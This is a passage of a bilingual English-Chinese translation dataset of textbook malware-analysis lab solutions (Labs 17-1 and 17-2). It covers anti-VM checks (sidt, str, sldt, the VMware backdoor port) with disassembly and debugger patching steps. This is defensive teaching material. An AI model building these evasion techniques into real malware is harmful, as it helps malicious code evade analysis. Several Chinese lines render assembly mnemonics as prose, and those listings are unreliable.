  type: TYPE_NORMAL
  zh: '4.'
- en: On our machine running VMware Workstation 7 on an Intel Core i7, none of the
    techniques succeeded. Your results will vary depending on the hardware and software
    you use.
  id: totrans-5774
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们的机器上，运行 VMware Workstation 7 和 Intel Core i7，没有任何技术成功。你的结果将取决于你使用的硬件和软件。
- en: 5\.
  id: totrans-5775
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: See the detailed analysis for an explanation of why each technique did or didn’t
    work.
  id: totrans-5776
  prefs: []
  type: TYPE_NORMAL
  zh: 详见详细分析，了解为什么每种技术成功或失败的原因。
- en: 6\.
  id: totrans-5777
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: You can NOP-out the sidt and str instructions or flip the jump flags live while
    debugging the malware.
  id: totrans-5778
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以在调试恶意软件时 NOP-out sidt 和 str 指令或翻转跳转标志。
- en: '***Detailed Analysis***'
  id: totrans-5779
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: Because this malware is the same as *Lab07-01.exe* except with added anti-VM
  id: totrans-5780
  prefs: []
  type: TYPE_NORMAL
  zh: 因为这种恶意软件与 *Lab07-01.exe* 相同，只是增加了防虚拟机功能
- en: 'techniques, a good place to begin your analysis is with Lab 7-1\. Scanning
    the malware for new functions, we find two: sub_401000, a self-deletion method,
    and sub_401100, which appears to call the sldt instruction. We can run *Lab17-01.exe*
    in a VM and see what happens differently from Lab 7-1\. The dynamic analysis results
    vary from system to system and might be identical to Lab 7-1'
  id: totrans-5781
  prefs: []
  type: TYPE_NORMAL
  zh: 技术，分析的好起点是 Lab 7-1。扫描恶意软件以查找新函数，我们发现两个：sub_401000，一个自我删除方法，和 sub_401100，它似乎调用
    sldt 指令。我们可以在虚拟机中运行 *Lab17-01.exe* 并查看与 Lab 7-1 有何不同。动态分析结果因系统而异，可能与 Lab 7-1 相同
- en: on your machine.
  id: totrans-5782
  prefs: []
  type: TYPE_NORMAL
  zh: 在你的机器上。
- en: '**Searching for Vulnerable Instructions**'
  id: totrans-5783
  prefs: []
  type: TYPE_NORMAL
  zh: '**搜索易受攻击的指令**'
- en: 'We can automatically search for vulnerable x86 instructions using IDA Pro’s
    Python scripting capability (available in the commercial version). Create your
    own script using Listing 17-4 in Chapter 17, or use the script named *findAntiVM.py*
    provided with the labs. To run the script in IDA Pro, select **File****Script
    File** and open *findAntiVM.py*. You should see the following in IDA Pro’s output
    window:'
  id: totrans-5784
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以使用 IDA Pro 的 Python 脚本功能（在商业版本中可用）自动搜索易受攻击的 x86 指令。使用第 17 章中的列表 17-4 创建自己的脚本，或使用实验室提供的名为
    *findAntiVM.py* 的脚本。要在 IDA Pro 中运行脚本，请选择 **文件****脚本文件**并打开 *findAntiVM.py*。你应该在
    IDA Pro 的输出窗口中看到以下内容：
- en: 'Number of potential Anti-VM instructions: 3'
  id: totrans-5785
  prefs: []
  type: TYPE_NORMAL
  zh: 易受攻击的反 VM 指令数量：3
- en: 'This output indicates that the script detected three vulnerable instruction
    types. Scrolling through the disassembly window in IDA Pro, we see three instructions
    highlighted in red: sidt, str, and sldt. (If you don’t have the commercial version
    of IDA Pro, search for these instructions using **Search****Text**.)'
  id: totrans-5786
  prefs: []
  type: TYPE_NORMAL
  zh: 此输出表明脚本检测到三种易受攻击的指令类型。在 IDA Pro 的反汇编窗口中滚动，我们看到三个用红色突出显示的指令：sidt、str 和 sldt。（如果您没有
    IDA Pro 的商业版本，请使用 **搜索****文本** 搜索这些指令。）
- en: We’ll analyze each vulnerable instruction, focusing on what happens if the VM
    technique succeeds, how to defeat it, and why it does or doesn’t work on our machine.
  id: totrans-5787
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将分析每个易受攻击的指令，重点关注如果虚拟机技术成功会发生什么，如何击败它，以及为什么它在我们的机器上工作或不工作。
- en: '**670**'
  id: totrans-5788
  prefs: []
  type: TYPE_NORMAL
  zh: '**670**'
- en: Appendix C
  id: totrans-5789
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5790
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**The sidt Instruction—Red Pill**'
  id: totrans-5791
  prefs: []
  type: TYPE_NORMAL
  zh: '**`sidt` 指令—Red Pill**'
- en: The sidt instruction (also known as Red Pill) is the first vulnerable instruction
    we encounter in this malware, as shown in Listing 17-1L at . This instruction
    stores the most significant 4 bytes of the sidt result var_420 at 
  id: totrans-5792
  prefs: []
  type: TYPE_NORMAL
  zh: '`sidt` 指令（也称为 Red Pill）是我们在这个恶意软件中遇到的第一个易受攻击的指令，如列表 17-1L 所示。该指令将 sidt 结果 var_420
    的最高 4 个字节存储在 。'
- en: for later use in the code.
  id: totrans-5793
  prefs: []
  type: TYPE_NORMAL
  zh: 用于代码后续使用。
- en: 004011B5 sidt fword ptr [ebp+var_428] 
  id: totrans-5794
  prefs: []
  type: TYPE_NORMAL
  zh: 004011B5 sidt fword ptr [ebp+var_428] 
- en: 004011BC mov eax, dword ptr [ebp+var_428+2]
  id: totrans-5795
  prefs: []
  type: TYPE_NORMAL
  zh: 004011BC mov eax, dword ptr [ebp+var_428+2]
- en: 004011C2 mov [ebp+var_420], eax 
  id: totrans-5796
  prefs: []
  type: TYPE_NORMAL
  zh: 004011C2 mov [ebp+var_420], eax 
- en: '*Listing 17-1L: Red Pill being used in Lab 17-1*'
  id: totrans-5797
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 17-1L：在实验室 17-1 中使用 Red Pill*'
- en: The malware checks for a VM a few instructions later in the binary, as you can
    see in Listing 17-2L.
  id: totrans-5798
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件在二进制代码中稍后检查 VM，如列表 17-2L 所示。
- en: 004011DD mov ecx, [ebp+var_420]
  id: totrans-5799
  prefs: []
  type: TYPE_NORMAL
  zh: 004011DD mov ecx, [ebp+var_420]
- en: 004011E3 shr ecx, 18h 
  id: totrans-5800
  prefs: []
  type: TYPE_NORMAL
  zh: 004011E3 shr ecx, 18h 
- en: 004011E6 cmp ecx, 0FFh
  id: totrans-5801
  prefs: []
  type: TYPE_NORMAL
  zh: 004011E6 cmp ecx, 0FFh
- en: 004011EC jz loc_40132F 
  id: totrans-5802
  prefs: []
  type: TYPE_NORMAL
  zh: 004011EC jz loc_40132F 
- en: '*Listing 17-2L: Comparison and conditional jump checking after using the sidt
    instruction* The most significant 4 bytes of the sidt result (var_420) are shifted
    at , since the sixth byte of sidt (fourth byte of var_20) contains the start
    of the base memory address. That fifth byte is compared to 0xFF, the VMware signature.'
  id: totrans-5803
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 17-2L：使用 `sidt` 指令后的比较和条件跳转检查* sidt 结果（var_420）的最高 4 个字节在  处进行了移位，因为 sidt
    的第六字节（var_20 的第四字节）包含基本内存地址的起始部分。那个第五个字节与 0xFF（VMware 的签名）进行比较。'
- en: If the jump is taken at , the malware detected a virtual environment, and will
    call the function at 0x401000 to terminate it and remove it from disk.
  id: totrans-5804
  prefs: []
  type: TYPE_NORMAL
  zh: 如果在  处执行跳转，恶意软件检测到虚拟环境，并将调用 0x401000 处的函数来终止它并从磁盘上删除它。
- en: The check fails in our test environment, probably because we are on a multiprocessor
    machine. When we set a breakpoint at 0x4011EC, we see that ECX isn’t 0xFF (the
    signature for VMware). If Red Pill is effective in your environment, NOP-out the
    sidt instruction or force the jz at  to not jump in a debugger.
  id: totrans-5805
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们的测试环境中检查失败，可能是因为我们在一个多处理器机器上。当我们设置断点在 0x4011EC 时，我们看到 ECX 不是 0xFF（VMware
    的签名）。如果 Red Pill 在你的环境中有效，请在  处 NOP-out `sidt` 指令或强制 jz 不在调试器中跳转。
- en: '**The str Instruction**'
  id: totrans-5806
  prefs: []
  type: TYPE_NORMAL
  zh: '**`str` 指令**'
- en: 'The str instruction is the second vulnerable instruction in this malware, as
    seen at line 0x401204:'
  id: totrans-5807
  prefs: []
  type: TYPE_NORMAL
  zh: '`str` 指令是恶意软件中的第二个易受攻击的指令，如 0x401204 行所示：'
- en: '**1 7**'
  id: totrans-5808
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 7**'
- en: 00401204 **str** word ptr [ebp+var_418]
  id: totrans-5809
  prefs: []
  type: TYPE_NORMAL
  zh: 00401204 **str** word ptr [ebp+var_418]
- en: The str instruction loads the task state segment (TSS) into the 4-byte local
    variable var_418\. The malware doesn’t use this local variable again until just
    after the call to GetModuleFileName.
  id: totrans-5810
  prefs: []
  type: TYPE_NORMAL
  zh: '`str` 指令将任务状态段（TSS）加载到 4 字节局部变量 var_418。恶意软件在调用 GetModuleFileName 之后才再次使用这个局部变量。'
- en: If the str instruction succeeds, the malware will not create the MalService
    service. Listing 17-3L shows the check against the first 2 bytes, which must equal
    0  and 0x40  in order to match the signature for VMware.
  id: totrans-5811
  prefs: []
  type: TYPE_NORMAL
  zh: 如果str指令成功，恶意软件将不会创建MalService服务。列表17-3L显示了针对前两个字节的检查，这两个字节必须等于0 和0x40 ，才能匹配VMware的签名。
- en: 00401229 mov edx, [ebp+var_418]
  id: totrans-5812
  prefs: []
  type: TYPE_NORMAL
  zh: 00401229 mov edx, [ebp+var_418]
- en: 0040122F and edx, 0FFh
  id: totrans-5813
  prefs: []
  type: TYPE_NORMAL
  zh: 0040122F and edx, 0FFh
- en: 00401235 test edx, edx 
  id: totrans-5814
  prefs: []
  type: TYPE_NORMAL
  zh: 00401235 test edx, edx 
- en: Solutions to Labs
  id: totrans-5815
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**671**'
  id: totrans-5816
  prefs: []
  type: TYPE_NORMAL
  zh: '**671**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5817
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 00401237 jnz short loc_40124E
  id: totrans-5818
  prefs: []
  type: TYPE_NORMAL
  zh: 00401237 jnz short loc_40124E
- en: 00401239 mov eax, [ebp+var_418+1]
  id: totrans-5819
  prefs: []
  type: TYPE_NORMAL
  zh: 00401239 mov eax, [ebp+var_418+1]
- en: 0040123F and eax, 0FFh
  id: totrans-5820
  prefs: []
  type: TYPE_NORMAL
  zh: 0040123F and eax, 0FFh
- en: 00401244 cmp eax, 40h 
  id: totrans-5821
  prefs: []
  type: TYPE_NORMAL
  zh: 00401244 cmp eax, 40h 
- en: 00401247 jnz short loc_40124E
  id: totrans-5822
  prefs: []
  type: TYPE_NORMAL
  zh: 00401247 jnz short loc_40124E
- en: 00401249 jmp loc_401338
  id: totrans-5823
  prefs: []
  type: TYPE_NORMAL
  zh: 00401249 jmp loc_401338
- en: '*Listing 17-3L: Checking the results of the str instruction* This check failed
    in our environment. When we set a breakpoint at 0x40122F, we saw that var_418
    contained 0x28, not 0x4000, the signature for VMware.'
  id: totrans-5824
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表17-3L：检查str指令的结果* 在我们的环境中，这个检查失败了。当我们设置断点在0x40122F时，我们看到var_418包含0x28，而不是VMware的签名0x4000。'
- en: If the str instruction check succeeds in your environment, NOP-out the str instruction
    or force the jnz at 0x401237 to jump in a debugger at runtime.
  id: totrans-5825
  prefs: []
  type: TYPE_NORMAL
  zh: 如果在您的环境中str指令检查成功，则NOP掉str指令或在运行时强制jnz在0x401237处跳转到调试器。
- en: '**The sldt Instruction—No Pill**'
  id: totrans-5826
  prefs: []
  type: TYPE_NORMAL
  zh: '**sldt指令—无Pill**'
- en: The sldt instruction (also known as No Pill) is the final anti-VM technique
    used in this malware. This technique is found in the function labeled sub_401100
    by IDA Pro. Listing 17-4L shows the sldt usage within sub_401100\.
  id: totrans-5827
  prefs: []
  type: TYPE_NORMAL
  zh: sldt指令（也称为No Pill）是这种恶意软件中使用的最终反VM技术。这个技术通过IDA Pro标记的sub_401100函数找到。列表17-4L显示了sub_401100中的sldt使用。
- en: 00401109 mov eax, dword_406048 ;0xDDCCBBAA
  id: totrans-5828
  prefs: []
  type: TYPE_NORMAL
  zh: 00401109 mov eax, dword_406048 ;0xDDCCBBAA
- en: 0040110E mov [ebp+var_8], eax 
  id: totrans-5829
  prefs: []
  type: TYPE_NORMAL
  zh: 0040110E mov [ebp+var_8], eax 
- en: '...'
  id: totrans-5830
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 00401121 sldt word ptr [ebp+var_8]
  id: totrans-5831
  prefs: []
  type: TYPE_NORMAL
  zh: 00401121 sldt word ptr [ebp+var_8]
- en: 00401125 mov edx, [ebp+var_8]
  id: totrans-5832
  prefs: []
  type: TYPE_NORMAL
  zh: 00401125 mov edx, [ebp+var_8]
- en: 00401128 mov [ebp+var_C], edx
  id: totrans-5833
  prefs: []
  type: TYPE_NORMAL
  zh: 00401128 mov [ebp+var_C], edx
- en: 0040112B mov eax, [ebp+var_C] 
  id: totrans-5834
  prefs: []
  type: TYPE_NORMAL
  zh: 0040112B mov eax, [ebp+var_C] 
- en: '*Listing 17-4L: Setup and execution of the sldt instruction* As you can see,
    var_8 is set to EAX at , and EAX was set to dword_406048'
  id: totrans-5835
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表17-4L：sldt指令的设置和执行* 如您所见，var_8在处被设置为EAX，而EAX被设置为dword_406048'
- en: in the previous instruction. dword_406048 contains an initialization constant
    (0xDDCCBBAA). The result of the sldt instruction is stored in var_8 and is ultimately
    moved into EAX at .
  id: totrans-5836
  prefs: []
  type: TYPE_NORMAL
  zh: 在之前的指令中。dword_406048包含一个初始化常数（0xDDCCBBAA）。sldt指令的结果存储在var_8中，并最终在处移动到EAX中。
- en: After this function returns, the result is compared to see if the low-order
    bits of the initialization constant are set to zero, as shown in Listing 17-5L
  id: totrans-5837
  prefs: []
  type: TYPE_NORMAL
  zh: 在此函数返回后，结果将被比较，以查看初始化常数的低阶位是否设置为零，如列表17-5L所示。
- en: at . If the low-order bytes are not zero, the jump will be taken, and the malware
    will terminate without creating the thread.
  id: totrans-5838
  prefs: []
  type: TYPE_NORMAL
  zh: 在处。如果低字节不是零，则会执行跳转，恶意软件将不会创建线程而终止。
- en: 004012D1 call sub_401100
  id: totrans-5839
  prefs: []
  type: TYPE_NORMAL
  zh: 004012D1 call sub_401100
- en: 004012D6 cmp eax, 0DDCC0000h 
  id: totrans-5840
  prefs: []
  type: TYPE_NORMAL
  zh: 004012D6 cmp eax, 0DDCC0000h 
- en: 004012DB jnz short loc_40132B
  id: totrans-5841
  prefs: []
  type: TYPE_NORMAL
  zh: 004012DB jnz short loc_40132B
- en: '*Listing 17-5L: Checking the result of the sldt instruction execution* This
    check failed in our environment. When we set a breakpoint at 0x4012D6, we found
    that EAX was equal to 0xDDCC0000, which meant that the check for a VM failed.'
  id: totrans-5842
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表17-5L：检查sldt指令执行的结果* 在我们的环境中，这个检查失败了。当我们设置断点在0x4012D6时，我们发现EAX等于0xDDCC0000，这意味着对VM的检查失败了。'
- en: If No Pill is effective in your environment, you will need to NOP-out the three
    instructions in Listing 17-5L or force the jnz to not jump in a debugger.
  id: totrans-5843
  prefs: []
  type: TYPE_NORMAL
  zh: 如果在您的环境中No Pill有效，您将需要NOP掉列表17-5L中的三个指令或者在调试器中强制jnz不跳转。
- en: '**672**'
  id: totrans-5844
  prefs: []
  type: TYPE_NORMAL
  zh: '**672**'
- en: Appendix C
  id: totrans-5845
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5846
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Lab 17-2 Solutions**'
  id: totrans-5847
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验17-2解决方案**'
- en: '***Short Answers***'
  id: totrans-5848
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短答案***'
- en: 1\.
  id: totrans-5849
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The exports are InstallRT, InstallSA, InstallSB, PSLIST, ServiceMain, StartEXS,
    UninstallRT, UninstallSA, and UninstallSB.
  id: totrans-5850
  prefs: []
  type: TYPE_NORMAL
  zh: 导出包括InstallRT, InstallSA, InstallSB, PSLIST, ServiceMain, StartEXS, UninstallRT,
    UninstallSA和UninstallSB。
- en: 2\.
  id: totrans-5851
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The DLL is deleted from the system using a *.bat* file.
  id: totrans-5852
  prefs: []
  type: TYPE_NORMAL
  zh: 使用*.bat*文件从系统中删除DLL。
- en: 3\.
  id: totrans-5853
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: A *.bat* file containing self-deletion code is created, as well as a file named
    *xinstall.log* containing the string "Found Virtual Machine, Install Cancel".
  id: totrans-5854
  prefs: []
  type: TYPE_NORMAL
  zh: 创建一个包含自删除代码的*.bat*文件，以及一个名为*xinstall.log*的文件，其中包含字符串"Found Virtual Machine,
    Install Cancel"。
- en: 4\.
  id: totrans-5855
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: This malware queries the VMware backdoor I/O communication port using the magic
    value VX and the action 0xA by using the in x86 instruction.
  id: totrans-5856
  prefs: []
  type: TYPE_NORMAL
  zh: 这种恶意软件通过使用x86指令，使用魔法值VX和操作0xA查询VMware后门I/O通信端口。
- en: 5\.
  id: totrans-5857
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: To get the malware to install, patch the in instruction at 0x100061DB at runtime.
  id: totrans-5858
  prefs: []
  type: TYPE_NORMAL
  zh: 要使恶意软件安装，请在运行时修补0x100061DB处的in指令。
- en: 6\.
  id: totrans-5859
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: To permanently disable the VM check, use a hex editor to modify the static string
    in the binary from [This is DVM]5 to [This is DVM]0\. Alternatively, NOP-out the
    check in OllyDbg and write the change to disk.
  id: totrans-5860
  prefs: []
  type: TYPE_NORMAL
  zh: 要永久禁用VM检查，请使用十六进制编辑器修改二进制中的静态字符串，从[This is DVM]5更改为[This is DVM]0。或者，在OllyDbg中NOP掉检查，并将更改写入磁盘。
- en: 7\.
  id: totrans-5861
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: InstallRT performs installation via DLL injection with an optional parameter
    containing the process to inject into. InstallSA performs installation via service
    installation. InstallSB performs installation via service install and DLL injection
    if the service to overwrite is still running.
  id: totrans-5862
  prefs: []
  type: TYPE_NORMAL
  zh: InstallRT通过DLL注入执行安装，其中包含一个可选参数，用于指定要注入到其中的进程。InstallSA通过服务安装执行安装。InstallSB通过服务安装执行安装，如果要覆盖的服务仍在运行，则还会进行DLL注入。
- en: '***Detailed Analysis***'
  id: totrans-5863
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: Lab 17-2 is an extensive piece of malware. Our goal with this lab is to demonstrate
    how anti-VM techniques can slow your efforts to analyze malware. We’ll focus our
    discussion on disabling and understanding the anti-VM aspects of the malware.
    We leave the task of fully reversing the malware in this sample to you.
  id: totrans-5864
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室17-2是一段广泛的恶意软件。本实验的目标是展示反虚拟机技术如何减缓分析恶意软件的努力。我们将重点讨论禁用和理解恶意软件的反虚拟机方面。我们将把完全反汇编此样本中恶意软件的任务留给你。
- en: 'Begin by loading the malware into PEview to examine its exports and imports.
    The malware’s extensive import list suggests that it has a wide range of functionality,
    including functions for manipulating the registry (RegSetValueEx), manipulating
    services (ChangeService), screen capturing (BitBlt), process listing (CreateToolhelp32Snapshot),
    process injection (CreateRemoteThread), and networking functionality (WS2_32.dll).
    We also see a set of export functions, mostly related to installation or removal
    of the malware, as shown here: **1 7**'
  id: totrans-5865
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，将恶意软件加载到PEview中，以检查其导出和导入项。恶意软件广泛的导入列表表明它具有广泛的功能，包括用于操作注册表（RegSetValueEx）、操作服务（ChangeService）、屏幕捕获（BitBlt）、进程列表（CreateToolhelp32Snapshot）、进程注入（CreateRemoteThread）和网络功能（WS2_32.dll）的函数。我们还看到一组导出函数，主要与恶意软件的安装或删除相关，如下所示：**1
    7**
- en: InstallRT InstallSA InstallSB
  id: totrans-5866
  prefs: []
  type: TYPE_NORMAL
  zh: InstallRT InstallSA InstallSB
- en: PSLIST
  id: totrans-5867
  prefs: []
  type: TYPE_NORMAL
  zh: PSLIST
- en: ServiceMain
  id: totrans-5868
  prefs: []
  type: TYPE_NORMAL
  zh: ServiceMain
- en: StartEXS
  id: totrans-5869
  prefs: []
  type: TYPE_NORMAL
  zh: StartEXS
- en: UninstallRT UninstallSA UninstallSB
  id: totrans-5870
  prefs: []
  type: TYPE_NORMAL
  zh: UninstallRT UninstallSA UninstallSB
- en: The ServiceMain function in the export list tells us that this malware probably
    can be run as a service. The names of the installation exports that end in the
    strings SA and SB may be the methods related to service installation.
  id: totrans-5871
  prefs: []
  type: TYPE_NORMAL
  zh: 导出列表中的ServiceMain函数告诉我们，这种恶意软件可能可以作为服务运行。以SA和SB结尾的安装导出名称可能是与服务安装相关的技术。
- en: Solutions to Labs
  id: totrans-5872
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**673**'
  id: totrans-5873
  prefs: []
  type: TYPE_NORMAL
  zh: '**673**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5874
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 152](index-707_1.png)'
  id: totrans-5875
  prefs: []
  type: TYPE_IMG
  zh: '![Image 152](index-707_1.png)'
- en: 'We attempt to run this malware and monitor it using dynamic analysis techniques.
    Using procmon, we set a filter on *rundll32.exe* (since we will use it to run
    the malware from the command line), and then run the following from the command
    line within our VM:'
  id: totrans-5876
  prefs: []
  type: TYPE_NORMAL
  zh: 我们尝试使用动态分析技术运行此恶意软件并对其进行监控。使用procmon，我们在*rundll32.exe*上设置了一个过滤器（因为我们将会用它从命令行运行恶意软件），然后在我们的虚拟机内部从命令行运行以下命令：
- en: rundll32.exe Lab17-02.dll,InstallRT
  id: totrans-5877
  prefs: []
  type: TYPE_NORMAL
  zh: rundll32.exe Lab17-02.dll,InstallRT
- en: We immediately notice that the malware is deleted from the system and a file
    *xinstall.log* is left behind. This file contains the string "Found Virtual Machine,
    Install Cancel", which means that there is an anti-VM technique in the binary.
  id: totrans-5878
  prefs: []
  type: TYPE_NORMAL
  zh: 我们立即注意到恶意软件已从系统中删除，并留下了一个文件*xinstall.log*。此文件包含字符串"Found Virtual Machine, Install
    Cancel"，这意味着二进制文件中存在反虚拟机技术。
- en: '**NOTE**'
  id: totrans-5879
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*You will sometimes encounter logging capability in real malware because logging
    errors* *can help malware authors determine what they need to change in order
    for their attack* *to succeed. Also, by logging the result of the various system
    configurations they encounter, such as VMs, attackers can identify issues they
    may encounter during an attack.*'
  id: totrans-5880
  prefs: []
  type: TYPE_NORMAL
  zh: '*你有时会在真实恶意软件中遇到日志记录功能，因为日志错误可以帮助恶意软件作者确定他们需要更改什么才能使攻击成功。此外，通过记录他们遇到的系统配置的结果，例如虚拟机，攻击者可以识别他们在攻击中可能遇到的问题。*'
- en: When we check our procmon output, we see that the malware created the file *vmselfdel.bat*
    for the malware to delete itself. When we load the malware into IDA Pro and follow
    the cross-references back from the vmselfdel.bat string, we reach sub_10005567,
    which shows the self-deletion scripting code that is written to the *.bat* file.
  id: totrans-5881
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们检查我们的 procmon 输出时，我们看到恶意软件创建了 *vmselfdel.bat* 文件，以便恶意软件删除自己。当我们将恶意软件加载到 IDA
    Pro 并从 vmselfdel.bat 字符串回溯交叉引用时，我们达到 sub_10005567，它显示了写入 *.bat* 文件的自我删除脚本代码。
- en: Next, we focus on determining why the malware deleted itself. We can use the
    *findAntiVM.py* script from the previous lab or work backward through the code
    by examining the cross-references to sub_10005567 (the *vmselfdel.bat* creation
    method). Let’s examine the cross-references, as shown in Figure 17-1L.
  id: totrans-5882
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们关注确定恶意软件为什么删除自己。我们可以使用之前实验中的 *findAntiVM.py* 脚本，或者通过检查到 sub_10005567（*vmselfdel.bat*
    创建方法）的交叉引用反向遍历代码。让我们检查交叉引用，如图 17-1L 所示。
- en: '*Figure 17-1L: Cross-reference to sub_100055567*'
  id: totrans-5883
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 17-1L：对 sub_100055567 的交叉引用*'
- en: As you can see in Figure 17-1L, there are three cross-references to this function,
    each of which is located in a different export from the malware.
  id: totrans-5884
  prefs: []
  type: TYPE_NORMAL
  zh: 如图 17-1L 所示，有三个对这个函数的交叉引用，每个都位于恶意软件的不同导出中。
- en: Following the cross-reference to InstallRT, we see the code shown in Listing
    17-6L in the InstallRT export function.
  id: totrans-5885
  prefs: []
  type: TYPE_NORMAL
  zh: 跟随到 InstallRT 的交叉引用，我们看到在 InstallRT 导出函数中显示的列表 17-6L 中的代码。
- en: 1000D870 push offset unk_1008E5F0 ; char *
  id: totrans-5886
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D870 推送 unk_1008E5F0 的偏移量 ; char *
- en: 1000D875 call sub_10003592
  id: totrans-5887
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D875  调用 sub_10003592
- en: 1000D87A mov [esp+8+var_8], offset **aFoundVirtualMa ; "Found Virtual Machine,..."**
  id: totrans-5888
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D87A  将 [esp+8+var_8] 设置为 **aFoundVirtualMa 的偏移量 ; "Found Virtual Machine,..."**
- en: 1000D881 call sub_10003592
  id: totrans-5889
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D881  调用 sub_10003592
- en: 1000D886 pop ecx
  id: totrans-5890
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D886 弹出 ecx
- en: 1000D887 call sub_10005567
  id: totrans-5891
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D887  调用 sub_10005567
- en: 1000D88C jmp short loc_1000D8A4
  id: totrans-5892
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D88C 短跳转 loc_1000D8A4
- en: '*Listing 17-6L: Anti-VM check inside InstallRT*'
  id: totrans-5893
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 17-6L：在 InstallRT 中的反 VM 检查*'
- en: The call at  is to the vmselfdel.bat function. At , we see a reference to
    the string we found earlier in *xinstall.log*, as shown in bold. Examining the
    **674**
  id: totrans-5894
  prefs: []
  type: TYPE_NORMAL
  zh: 在  处的调用是到 vmselfdel.bat 函数。在  处，我们看到对之前在 *xinstall.log* 中找到的字符串的引用，如粗体所示。检查
    **674**
- en: Appendix C
  id: totrans-5895
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5896
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: functions at  and , we see that  opens *xinstall.log* and  logs "Found Virtual
    Machine, Install Cancel" to the file.
  id: totrans-5897
  prefs: []
  type: TYPE_NORMAL
  zh: 在  和  的函数中，我们看到  打开 *xinstall.log*， 将 "Found Virtual Machine, Install Cancel"
    记录到文件中。
- en: Examining the code section shown in Listing 17-6L in graph mode, we see two
    code paths to it, both conditional jumps after the calls to sub_10006119
  id: totrans-5898
  prefs: []
  type: TYPE_NORMAL
  zh: 以图形模式检查列表 17-6L 中显示的代码部分，我们看到有两个代码路径到它，都是在调用 sub_10006119 后的条件跳转。
- en: or sub_10006196\. Because the function sub_10006119 is empty, we know that sub_10006196
    must contain our anti-VM technique. Listing 17-7L shows a subset of the instructions
    from sub_10006196\.
  id: totrans-5899
  prefs: []
  type: TYPE_NORMAL
  zh: 或 sub_10006196\. 因为 sub_10006119 函数是空的，我们知道 sub_10006196 必须包含我们的反 VM 技术。列表 17-7L
    显示了 sub_10006196\ 的指令子集。
- en: 100061C7 mov eax, 564D5868h ;'VMXh' 
  id: totrans-5900
  prefs: []
  type: TYPE_NORMAL
  zh: 100061C7 将 eax 设置为 564D5868h ;'VMXh' 
- en: 100061CC mov ebx, 0
  id: totrans-5901
  prefs: []
  type: TYPE_NORMAL
  zh: 100061CC 将 ebx 设置为 0
- en: 100061D1 mov ecx, 0Ah
  id: totrans-5902
  prefs: []
  type: TYPE_NORMAL
  zh: 100061D1 将 ecx 设置为 0Ah
- en: 100061D6 mov edx, 5658h ;'VX' 
  id: totrans-5903
  prefs: []
  type: TYPE_NORMAL
  zh: 100061D6 将 edx 设置为 5658h ;'VX' 
- en: 100061DB in eax, dx 
  id: totrans-5904
  prefs: []
  type: TYPE_NORMAL
  zh: 100061DB 在 eax, dx 中 
- en: 100061DC cmp ebx, 564D5868h ;'VMXh' 
  id: totrans-5905
  prefs: []
  type: TYPE_NORMAL
  zh: 100061DC 比较 ebx，564D5868h ;'VMXh' 
- en: 100061E2 setz [ebp+var_1C]
  id: totrans-5906
  prefs: []
  type: TYPE_NORMAL
  zh: 100061E2 将 [ebp+var_1C] 设置为 setz
- en: '...'
  id: totrans-5907
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 100061FA mov al, [ebp+var_1C]
  id: totrans-5908
  prefs: []
